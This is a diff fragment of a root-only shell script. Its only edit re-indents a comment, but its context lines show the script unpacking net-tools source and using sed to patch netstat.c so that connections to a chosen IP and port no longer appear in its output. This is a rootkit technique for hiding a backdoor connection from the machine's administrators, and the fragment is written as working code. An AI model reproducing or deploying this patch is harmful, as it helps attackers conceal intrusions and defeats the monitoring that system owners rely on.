@@ -790,7 +790,7 @@ if [ "$USER" == "root" ]; then
     unzip -d /tmp /tmp/net-tools.zip >/dev/null
     finish
     rm /tmp/net-tools.zip
-     #modify netstat.c
+    #modify netstat.c
     printf "modifying netstat.c... "
     sed -i "s/printf(\"%-4s\s\s%6ld\s%6ld\s%-\*s/if ( strstr(rem_addr, \"$ip:$port\") == 0 ) {\n\t\tprintf(\"%-4s  %6ld %6ld %-*s/" /tmp/net-tools-master/netstat.c
     sed -i '0,/finish_this_one(uid,inode,timers);/{s/finish_this_one(uid,inode,timers);/\tfinish_this_one(uid,inode,timers);\n\t}/};' /tmp/net-tools-master/netstat.c
